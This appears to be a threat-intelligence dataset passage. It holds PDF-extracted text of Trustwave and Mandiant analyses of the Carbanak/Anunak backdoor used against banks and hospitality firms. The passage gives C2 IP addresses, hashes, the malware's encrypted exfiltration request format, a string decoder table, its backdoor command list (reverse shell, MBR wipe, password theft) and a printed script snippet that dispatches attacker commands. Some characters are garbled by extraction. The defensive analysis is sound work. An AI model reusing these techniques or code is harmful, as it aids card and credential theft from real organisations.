099af53f601532dbd31e0ea99ffdeb64 %ADOBEUPDTOOL%"". (This Service was installed by the dropper of this script.). It then deletes this script. cbd22ed4f5cd88afcfeae0cfc80ed482 Not actually a command, but somewhat an indicator that will be sent to the control server each time a script is executed. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 22 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 The malware checks for the following registry key if the command has the same cmduniq value. If it is the same, it terminates the script, otherwise it writes the cmdunig value to this registry key: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\c_last Following is the System information sent to the control server when the command ""INFO"" is received from the attacker. OS Name Version Service Pack OS Manufacturer Windows Directory Locale Available Physical Memory Total Virtual Memory Available Virtual Memory System Name System Manufacturer System Model Time Zone Total Physical Memory Processor System Type Processor BIOS Version Computer name Domain User name This system information is also stored in this registry key: HKEY_CURRENT_USER\System\CurrentControlSet\Control\Network\CLM The result data is exfiltrated after each https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 23 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 attackers command is executed. This is sent as a HTTP POST request to the control server. POST /{random_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of Date & Time Now} à this is encrypted in RC4 with hardcoded key and Base64. The POST parameters may also be iterated up to 3 times. User-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 Charset:utf-8 Connection: Keep-Alive Keep-Alive:300 Content-Type: ""multipart/form-data; boundary=""{Random MD5 hash}"" The HTTP POST uses the body format below: --{random MD5 hash} Content-Disposition: form-data; name="" {random name}"" {unique ID and current Date/Time Hash - encrypted with RC4 and Base64} --{random MD5 hash} Content-Disposition: form-data; name="" {random name}"" pPar1c==={unique ID encrypted with RC4 and Base64} --{random MD5 hash} Content-Disposition: form-data; name="" {random name}"" pPar2c==={command's MD5 Hash encypted with RC4 and Base64} --{random MD5 hash} Content-Disposition: form-data; name="" {random name}"" pPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64} https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 24 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 After executing the command and exfiltrating the data, the malware sleeps for 3- 5 minutes (depending on the configuration hard-coded in the script) then loops to request the command again. Network Command and Control Servers: http://148.251.18.75 http://95.215.46.221 http://95.215.46.229 http://95.215.46.234 http://81.17.28.124 Detailed Analysis of Carbanak Malware: bf.exe File Info Filename: bf.exe Size: 267216 Filetype: PE32 executable (GUI) Intel 80386, for MS Windows Compile Date: 2016-03-01 08:50:54 Sha1 Hash: 3d00602c98776e2ea5d64a78fc622c4ff08708e3 MD5 Hash: c7b224d95fc96094afd2678cae753dcb Summary The file is a variant of Anunak/Carbanak malware. It provides functions from gathering information about the system to downloading and executing additional malware. Analysis: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 25 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Malware Installation This malware unpacks its main executable in memory and executes it. It then drops a config file in the %appdata%\Mozilla folder as well as copy of itself with the filename ""svchost.exe"". The config filename is a base64 string comprising of a unique string and the MAC address of the infected system. For example V14UDFcJZ1FfXQIIVA== to V14UDFcJZ1FfXQIIVA.bin. It then spawns a new svchost.exe process with the command: ""C:\WINDOWS\system32\svchost.exe -k netsvcs"" and then injects its code to that process. After process injection, the main malware executable terminates. In this example the Mutex named ""V14UDFcJZ1FfXQIIVA"" is then created. For persistency, it registers itself as a service with the following details: Service name: RpcSsSys (this name is random, may vary on different systems) Path: ""C:\Documents and Settings\All Users\Application Data\Mozilla\svchost.exe"" Display name: Emote Procedure Call (RPC) Anti-reversing The malware checks for the ""isDebugged"" flag in the PEB (Process Environment Block). It also checks for significant delay of code execution by utilizing the GetTickCount() function. Delay in code execution means the process is being https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 26 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 debugged. Strings are heavily obfuscated to avoid static string analysis. The malware has a decoder table loaded in memory that is used for its lookup algorithm. All strings are deobfuscated on-the-fly. decodertable = ""\x00\x12\x1C\x13\x0A\x0D\x14\x07\x15\x0C\x16\x09\x05\x03\x17\x1D\x1A\x10\x1F \x0E\x08\x06\x11\x04\x1E\x19\x0B\x1B\x01\x02\x0F\x18\x20\x21\x42\x5E\x24\x25\x26\x4A\x28\x29\x6A\x6B \x2C\x2D\x53\x22\x30\x31\x7F\x4E\x34\x35\x4B\x5A\x38\x39\x7A\x7B\x3C\x3D\x43\x5F\x40\x41\x62\x63\x44 \x45\x46\x27\x48\x49\x47\x2B\x4C\x4D\x73\x4F\x50\x51\x52\x2E\x54\x55\x56\x57\x58\x59\x3A\x5B\x5C\x5D \x7E\x72\x60\x61\x2F\x23\x64\x65\x66\x2A\x68\x69\x67\x36\x6C\x6D\x33\x6F\x70\x71\x3F\x6E\x74\x75\x76 \x77\x78\x79\x37\x3B\x7C\x7D\x3E\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" A sample code snippet of the Decoder: An API Hashing technique is also utilized by the malware in order to hide relevant API functions it uses in its code. Rather than storing imported API names in the body, the malware author has pre-calculated the CRC hash of the API function. On runtime, all the malware does is to look-up the equivalent API name from its generated hash table. Antivirus retaliation Specific Kaspersky antivirus processes are terminated: avp.exe avpui.exe https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 27 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Escalation of Privilege The malware checks the system OS: Windows 8.1 Windows 8 Windows 7 SP1 Windows Vista SP2 Windows RT 8.1 Windows RT Windows XP SP1 Windows XP SP2 Windows XP SP3 Windows Server 2012 Windows Server 2012 R2 Windows Server 2008 SP2 Windows Server 2008 R2 SP1 Windows Server 2003 SP2 If found, it attempts to exploit a vulnerability in ""win32k.sys"" identified as CVE-2013-3660 to escalate the privilege of the malware process. Obtaining the Proxy Settings The malware gets the proxy setting from the Internet Explorer registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer It also gets the proxy setting stored in Mozilla's https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 28 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 prefs.js file. The attacker however can push its own custom proxy settings to the malware. Enabling Remote Desktop The malware enables the Remote Desktop by starting the Termservice service. It also sets the service to auto-mode so that the service will start on Windows startup. It also enables the following Terminal Server registry key: HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server fDenyTSConnection EnableConcurrentSessions AllowMultipleTSSession POS Malware Before the main POS routine, the malware searches data from the log file named ""nsb.pos.client.log"" and C:\NSB\Coalition\Log It then enumerates the processes listed in a config file (klgconfig.plug) pulled from the control server. From here it scrapes the process memory heap for credit card data, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 29 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 specifically the Track 1. After collecting the card data, it creates a file where it stores the information. This is the code snippet where it saves the data to an XML file: Outlook Items The malware also targets victim's email data by scrounging the victim's Outlook PST files for contact's email addresses, possibly to be used for further spear-phishing attacks from known individuals. Local Password Stealer The malware utilizes the open source project called Mimikatz and reused codes from this project to steal clear text local passwords from Lsass memory dump. Plugins !"" ifobs.pl- the malware reused code from the Carperp ifobs module to target a banking application called iFOBS. This is a https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 30 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 very popular banking platform in Russia and Eastern Europe and this malware can be used to compromise IFOBS banking systems. When using this module, the malware hooks the following libraries: { ""VistaDB_D7.bpl"", ""HProc2"", 0xA9782FE7, ""OpenDatabaseConnection"" }, { ""RtlData1.bpl"", ""HProc3"", 0×1678D314, ""TaskAfterSynchRun"" }, { ""vcl70.bpl"", ""HProc4"", 0×8D55F8B4, ""TCustomFormShow"" }, { ""vcl70.bpl"", ""HProc5"", 0×3DF02899, ""TCustomFormCloseQuery"" }, { ""RtlStore.bpl"", ""HProc6"", 0xCF6CD66, ""GlobalAppStorage"" }, { ""RtlData1.bpl"", ""HProc7"", 0xAFD2F1E2, ""FillDataToDBCache"" }, $"" ammyy.pl- this enables the malware to run AMMYY remote desktop control software %"" vnc.pl- this enables the malware to run a remote desktop VNC application Backdoor Commands The attacker can also send backdoor commands. In the malware code, a command hash table is used to compare commands (in readable strings) sent by the attacker, the hash of this command string is calculated by the malware. If the hash of the string matches any hash in the table, it executes the corresponding action. The image below is the command and it's corresponding hash (in green font) https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 31 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 Network It connects to a hardcoded IP address: 5.45.179.173 or 95.215.45.94 through an encrypted tunnel at port 443. Compiler/Artifacts The following sections describe artifacts found in the file Malware Version Info legalcopyright: Blattering internalname: Soulfulness companyname: Maidish Leveraged legaltrademarks: Bobcats Kinsman filedescription: Sanger originalfilename: Adoptable Nightjars Conclusion In many ways, this attack follows a very https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 32 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 common series of events: !"" Social engineering / phishing used to gain initial network foothold $"" Cleverly disguised malware establishes remote control of victim system and downloads additional tools %"" Attacker conducts reconnaissance to scan network, expand foothold, and identify high-value targets &"" Payment card information and/or PII (personally identifiable information) is captured and exfiltated back to the attacker. However, the persistence, professionalism, and pervasiveness of this campaign is at a level rarely seen by Trustwave. The malware used is very multifaceted and still not caught by most (if any) antivirus engines. The social engineering is highly targeted, conducted via direct phone calls by threat actors with excellent English skills. The network reconnaissance and lateral movement is rapid and highly effective. Finally, the data exfiltration methodology is stealthy and efficient. Carbanak is one of the most sophisticated threat actors in the cybercrime realm today and this report details a very active campaign currently being leveraged against hospitality and restaurant industries (and probably others). We encourage everyone to search their network for the IOC's described in this report and to contact Trustwave immediately if any are found. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 33 di 36 New Carbanak / Anunak Attack Methodology 18/07/24, 17:42 **Credits for the analysis and creation of this cyber threat announcement: Rodel Mendrez, Reno Zenere, James Antonakos, Brian Hussey Latest SpiderLabs Blogs https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/ Pagina 34 di 36"
carbanak,cti-hal,880de9dd8ee0,G0008,"Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Trustwave Unveils New Offerings to Maximize Value of Microsoft Security Investments. Learn More Contact Us Login Incident Response Services Solutions SPIDERLABS BLOG Why Trustwave Request a Demo Partners Resources Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 January 18, 2017 | 5 minutes read | SpiderLabs Researcher The Trustwave SpiderLabs team has been actively tracking a malicious campaign conducted by the well-known Carbanak Cybercrime group for the latter part of 2016 and into 2017. Carbanak is one of the most prolific organized Russian cybercrime groups and is responsible for the theft of billions of https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 1 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 dollars from legitimate economies to the criminal underground. Malware attributed to this group has been cited in the infamous ""billion dollar bank hack"" of 2015 and the massive Oracle/Micros hack of mid-2016 that led to over a million vulnerable POS servers. Carbanak malware (Carberp family) was also cited by Homeland Security and the FBI as an Indicator of Compromise for Russian Intelligence Service malicious activity in their most recent report GRIZZLY STEPPE – Russian Malicious Cyber Activity. Trustwave has tracked Carbanak activity in the latter half of 2016 and found them to be targeting hospitality and retail victims in Europe and North America, specifically targeting their internal corporate secrets and protected payment card data. Trustwave published a blog earlier in the year within initial findings but has now released the complete malicious campaign profile in a 45-page Advanced Threat Report. The blog post below is a summary of the malicious profile we have developed for this actor. Operation Grand Mars During September and October of 2016, Trustwave SpiderLabs was simultaneously consulted by several leading organizations from the hospitality sector in Europe and the United States to analyze suspicious and potentially malicious activity on their network including servers, point of sale terminals, and client workstations spread across different properties and locations. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 2 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 The motivation of this operation appears to be financial gain, total control of the infrastructure and collection of bots within the victim organizations. During the forensics investigation and analysis, we were given the impression that several activities have been performed by different persons or even different groups of people. We believe that malicious gangs cooperated in this operation with each group holding their own role and task. It soon became obvious that we are dealing with organized crime responsible for establishing this complex system of network hosts and large number of malicious files in order to perform the attacks against multiple victims. The organizations under attack were first alerted either because their enterprise AV service discovered pieces of potentially malicious software or from suspicious indicators in Windows event logs. Since the victims were different organizations the investigations were held by separate teams within Trustwave but intelligence sharing among the teams proved that several similarities existed among the attacks. Entry Point The common successful entry point within all operations was an email message targeted to victim's public-facing services that contained a Microsoft Word document attachment. Upon opening the attachment multiple malicious files were created or downloaded allowing the attackers to gain some level of access into the victim's infrastructure. In some cases, https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 3 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 attackers actually called the victims over the phone, social engineering vector, in order to trick staff into opening the attachment. Figure 1: Malicious Word document Figure 2: Encrypted Script from malicious document So the malicious Word document when opened, executes the embedded script and drops the following four files: Figure 3: Files dropped on execution of embedded VBE script https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 4 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Malicious Scripts The role of each of the four dropped files is visually represented in the following activity diagram: Figure 4: File process Pastebin Account An additional file ""dttsg.txt"" has the following structure and is split into two sections ""last"" and ""code"" providing another covert channel during this operation. {last: ""abc123"", code: ""ZGltIHh4eA==""} Code from Pastebin Contents of this file retrieved from a Pastebin account used in the attacks as part of the command control mechanism by the attackers belongs to an individual identified as ""Shtokov"". This is yet another (weak) indication of the involvement of Russian/Eastern European actors in these attacks. Figure 5: Shtokov Pastebin site used in Command and https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 5 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Control Data from section ""last"" is written into registry perhaps to keep track of last executed command and ""code"" which is Base64 encoded used as an argument and allows attackers to execute one of the following commands ""Destroy"", ""GetCompInfo"", ""GetProcList"" and ""RunCMDLine"" as displayed below. However, usage of this feature was not observed during our investigation. var cod_data = Base64.decode(cmb_ob.c); if(cod_data == ""#deleteBot#""){ destroy(); }else if(cod_data == ""#GetCompInfo#""){ Log(""$stdOut$"" + GetComputerInform()); }else if(cod_data == ""#GetProcList#""){ Log(""$stdOut$"" + GetCompProcess()); }else if( cod_data.indexOf(""#RunCMDLine# "") !== -1){ var cmd_str = split(cod_data,'#RunCMDLine#', 2); Log(""$stdOut$"" + RunCMDLine(cmd_str[1])); }else{ https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 6 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 var tempname1 = ""LanCradDriver.ini""; var tempname2 = ""LanCradDriver.vbs""; var tmpPath = GLBFolderPlus; var tempath1 = tmpPath + ""\\""+tempname1; var tempath2 = tmpPath + ""\\""+tempname2; var f = FSO.OpenTextFile(tempath1,2,fa lse,-1); f.Write(cod_data); f.Close(); Arguments from Pastebin Privilege escalation Privilege escalation was performed by means of various Pass-the-Hash techniques while persistence was achieved by utilizing scheduled tasks and several of the Operating System's auto-start locations. Ultimately these actions allowed attackers to gain Domain or even Enterprise Admin access and gain network access by using several resources as Command & Control points in Europe and the US. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 7 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Figure 6: Event log showing Pass-the-Hash indicators An event ID 4624 displayed above showing the usage of a local account performing network logon (Logon Type:3) using a randomized source computer name (Workstation Name: T5NMapiY4kGetJDe) most probably a result of an automated tool. Google Docs Cloud services such as Google Docs and Google Forms were involved allowing attackers to keep track of infected systems, spread malware and perform further malicious activities. Usage of such services as part of the attack is always beneficial for attackers since most enterprise networks allow access to these and it is almost impossible to blacklist them. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 8 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Figure 7: Google forms used for tracking victims Malicious code used in these operations was split among memory resident code, scripting code (PowerShell, JavaScript, VBS), executables (often variants of existing malware) and finally usage of customized versions of toolkits such as Metasploit, PowerSploit and Veil Framework. Figure 8: Encoded PowerShell commands retrieved from Google Spreadsheet Anunak variant and other signed malware What seems to be the core tools of these activities is a variant of Anunak, remote backdoor, along with a Visual Basic Script specially crafted with data exfiltration features. https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…rand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 9 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 One other significant finding is that some of the executables were signed using valid certificates from Comodo, a Certification Authority. Based on the analysis of the certificates we believe that the attackers actually used fake identity and purchased these to bypass further security controls potentially in place. Figure 9: Certificate used to code-sign Anunak Threat Report We called this operation ""Grand Mars"" after the company name that cyber criminals used in one of the digital certificates purchased from Comodo. Most likely, the name and all Russian details (city, address etc.) used in the certificate details are fake, however, the point that someone actually paid for these is a strong indicator that we are dealing with organized criminal activities. This threat report describes what we believe to be a systematic criminal operation of attacks targeting the hospitality sector in https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/…and-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 10 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 Europe and the US, at least at this time. However, the findings suggest that other sectors such as e-commerce and retail are equally at risk and the campaign could just as easily spread to other parts of the world. The majority of IP addresses used as Command & Control points were unknown systems located within Europe (UK, France, Sweden etc.) indicating that attackers were trying to bypass network security controls by using seemingly innocuous servers as malicious endpoints. During the investigation of this operation we monitored access to these C&C servers and found that the attackers would occasionally change their C&C server and take the previous one off-line. We believe that this alternating use of C&C servers was a purposeful action by attackers in order to remain as stealthy as possible. Their location and role is depicted below in the European region map. (note: Three servers located in N. America, not shown for simplicity). This threat report intends to provide an analysis of this operation and document: Our analysis and findings in a way that describe the nature of malicious activities, the tactics and tradecraft utilized by the attackers, possible motives and the attribution of the threat actors behind these attacks. Remediation actions and advice to organizations that have already been targeted by this campaign of attacks or willing to take proactive https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/o…and-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 11 di 14 Operation Grand Mars: a comprehensive profile of Carbanak activity in 2016/17 16/07/24, 17:51 countermeasures. Indicators of Compromise (IOCs) that will benefit organizations seeking to either undertake a compromise assessment on their own (or with the help of a team that specializes in threat hunting and compromise assessments such as Trustwave SpiderLabs), or to proactively put in place detection mechanisms for providing an early warning system if and when the organization is targeted. However, it must be noted that this threat report does not and is not capable of replacing formal incident response actions and procedures that must be undertaken to mitigate the threat and restore business functions as per the Organizational Incident Response/Disaster Recovery roadmap. Thanks to Sachin Deodhar and Rodel Mendrez for their contribution to the research described in this post. UPDATE: Here are the SHA1 fingerprints of the two certificates found in this investigation: c1:9c:df:78:e2:34:29:fa:f6:86:bd:f8:ff:dc:f5:ef:0b:9f:14:56 aa:a6:e7:dc:9b:df:2d:90:31:c0:ec:b0:32:bc:68:67:77:20:5f:92 Latest SpiderLabs Blogs https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/…and-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/ Pagina 12 di 14"
carbanak,cti-hal,c0eefab3645f,G0008,"Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Behind the CARBANAK Backdoor June 12, 2017 Mandiant Wri!en by: James T. Benne!, Barry Vengerik In this blog, we will take a closer look at the powe""ul, versatile backdoor known as CARBANAK (aka Anunak). Speci#cally, we will focus on the operational details of its use over the past few years, including its con#guration, the minor variations observed from sample to sample, and its evolution. With these details, we will then draw some conclusions about the operators of CARBANAK. For some additional background on the CARBANAK backdoor, see the papers by Kaspersky and Group-IB and Fox-It. Technical Analysis Before we dive into the meat of this blog, a brief technical analysis of the backdoor is necessary to provide some context. CARBANAK is a full-featured backdoor with data-stealing capabilities and a plugin architecture. Some of its capabilities include key logging, desktop video capture, VNC, HTTP form grabbing, #le system management, #le transfer, TCP tunneling, HTTP proxy, OS destruction, POS and Outlook data the$ and reverse shell. Most of these data-stealing capabilities were present in the oldest variants of CARBANAK that we have seen and some were added over time. Monitoring Threads https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 1 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 The backdoor may optionally sta% one or more threads that pe""orm continuous monitoring for various purposes, as described in Table 1. Thread Name Key logger Description Logs key strokes for con#gured processes and sends them to the command and control (C2) server Form Monitors HTTP tra'c for form data and sends it to grabber the C2 server POS monitor PST monitor Monitors for changes to logs stored in C:\NSB\Coalition\Logs and nsb.pos.client.log and sends parsed data to the C2 server Searches recursively for newly created Outlook personal storage table (PST) #les within user directories and sends them to the C2 server HTTP proxy Monitors HTTP tra'c for requests sent to HTTP proxies, saves the proxy address and credentials monitor for future use Table 1: Monitoring threads Commands In addition to its #le management capabilities, this data-stealing backdoor suppo%s 34 commands that can be received from the C2 server. A$er decryption, these 34 commands are plain text with parameters that are space delimited much like a command line. The command and parameter names are hashed before being compared by the binary, making it di'cult to recover the original names of commands and parameters. Table 2 lists these commands. Command Command Hash Name Description https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 2 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 0x0AA37987 loadcon#g con#guration #le (see Runs each command speci#ed in the 0x007AA8A5 state the Con#guration section). Updates the state value (see the Con#guration section). 0x007CFABF video Desktop video recording 0x06E533C4 download and injects into new Downloads executable process 0x00684509 ammyy Ammyy Admin tool 0x07C6A8A5 update Updates self Add/Update klgcon#g 0x0B22A5A7 (analysis incomplete) 0x0B77F949 h!pproxy Sta%s HTTP proxy 0x07203363 killos 0x078B9664 reboot 0x07BC54BC tunnel Renders computer unbootable by wiping the MBR Reboots the operating system Creates a network tunnel Adds new C2 server or 0x07B40571 adminka proxy address for 0x079C9CC2 server pseudo-HTTP protocol Adds new C2 server for custom binary protocol https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 3 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 0x0007C9C2 user 0x000078B0 rdp 0x079BAC85 secure custom binary protocol Creates or deletes Windows user account Enables concurrent RDP (analysis incomplete) Adds Noti#cation Package (analysis incomplete) 0x00006ABC del Deletes #le or service 0x0A89AF94 sta%cmd Adds command to the con#guration #le (see the Con#guration section) Downloads executable 0x079C53BD runmem and injects directly into new process Send Windows 0x0F4C3903 logonpasswords accounts details to the C2 server 0x0BC205E4 screenshot the desktop and sends Takes a screenshot of 0x007A2BC0 sleep it to the C2 server Backdoor sleeps until speci#ed date 0x0006BC6C dupl Unknown 0x04ACAFC3 Upload #les to the C2 server 0x00007D43 vnc Runs VNC plugin 0x09C4D055 run#le Runs speci#ed executable #le https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 4 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 0x02032914 killbot Uninstalls backdoor 0x08069613 listprocess processes to the C2 Returns list of running 0x073BE023 plugins 0x0B0603B4 server Change C2 protocol used by plugins Download and execute shellcode from speci#ed address Terminates the #rst 0x0B079F93 killprocess process found speci#ed 0x00006A34 cmd by name Initiates a reverse shell to the C2 server 0x09C573C7 runplug Plugin control 0x08CB69DE autorun Updates backdoor Table 2: Suppo!ed Commands Con!guration A con#guration #le resides in a #le under the backdoor’s installation directory with the .bin extension. It contains commands in the same form as those listed in Table 2 that are automatically executed by the backdoor when it is sta%ed. These commands are also executed when the loadcon#g command is issued. This #le can be likened to a sta%up script for the backdoor. The state command sets a global variable containing a series of Boolean values represented as ASCII values ‘0’ or ‘1’ and also adds itself to the con#guration #le. Some of these values indicate which C2 protocol to use, whether the backdoor has been installed, and whether the PST monitoring thread is running or not. Other than the state command, all commands in the con#guration #le are identi#ed by their hash’s decimal value instead of their plain text name. Ce%ain commands, when executed, add themselves to the con#guration so they will persist across (or be pa% of) reboots. https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 5 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 The loadcon#g and state commands are executed during initialization, e(ectively creating the con#guration #le if it does not exist and writing the state command to it. Figure 1 and Figure 2 illustrate some sample, decoded con#guration #les we have come across in our investigations. Figure 1: Con""guration ""le that adds new C2 server and forces the data- stealing backdoor to use it Figure 2: Con""guration ""le that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol. Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the ‘|’ character. A message sta%s with a host ID composed by concatenating a hash value generated from the computer’s hostname and MAC address to a string likely used as a campaign code. Once the message has been forma!ed, it is sandwiched between an additional two #elds of randomly generated strings of upper and lower case alphabet characters. An example of a command polling message and a response to the listprocess command are given in Figure 3 and Figure 4, respectively. Figure 3: Example command polling message Figure 4: Example command response message Messages are encrypted using Microso$’s implementation of RC2 in CBC mode with PKCS#5 padding. The encrypted message is then Base64 encoded, replacing all the ‘/’ and ‘+’ characters with https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 6 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 the ‘.’ and ‘-’ characters, respectively. The eight-byte initialization vector (IV) is a randomly generated string consisting of upper and lower case alphabet characters. It is prepended to the encrypted and encoded message. The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inse%ed at random locations within the encoded payload. The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a #le extension from the following list with no parameters: gif, jpg, png, htm, html, php. This URI is then used in a GET or POST request. The body of the POST request may contain #les contained in the cabinet format. A sample GET request is shown in Figure 5. Figure 5: Sample pseudo-HTTP beacon The pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command. The backdoor also searches for proxy con#gurations to use in the registry at HKCU\So$ware\Microso$\Windows\CurrentVersion\Internet Se!ings and for each pro#le in the Mozilla Firefox con#guration #le at %AppData%\Mozilla\Firefox\\prefs.js. Custom Binary Protocol Figure 6 describes the structure of the malware’s custom binary protocol. If a message is larger than 150 bytes, it is compressed with an unidenti#ed algorithm. If a message is larger than 4096 bytes, it is broken into compressed chunks. This protocol has undergone several changes over the years, each version building upon the previous version in some way. These changes were likely introduced to render existing network signatures ine(ective and to make signature creation more di'cult. Figure 6: Binary protocol message format Version 1 https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 7 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 In the earliest version of the binary protocol, we have discovered that the message bodies that are stored in the #eld are simply XORed with the host ID. The initial message is not encrypted and contains the host ID. Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session. This key is sent in the initial message. Version 3 Version 3 adds encryption to the headers. The #rst 19 bytes of the message headers (up to the #eld) are XORed with a #ve-byte key that is randomly generated per message and stored in the #eld. If the #eld of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages. Version 4 This version adds a bit more complexity to the header encryption scheme. The headers are XOR encrypted with and combined and reversed. Version 5 Version 5 is the most sophisticated of the binary protocols we have seen. A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately. Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm. All subsequent messages are encrypted with AES in CBC mode. The use of public key cryptography makes decryption of the session key infeasible without the C2 server’s private key. The Roundup We have rounded up 220 samples of the CARBANAK backdoor and compiled a table that highlights some interesting details that we https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 8 di 14 Behind the CARBANAK Backdoor | Mandiant | Google 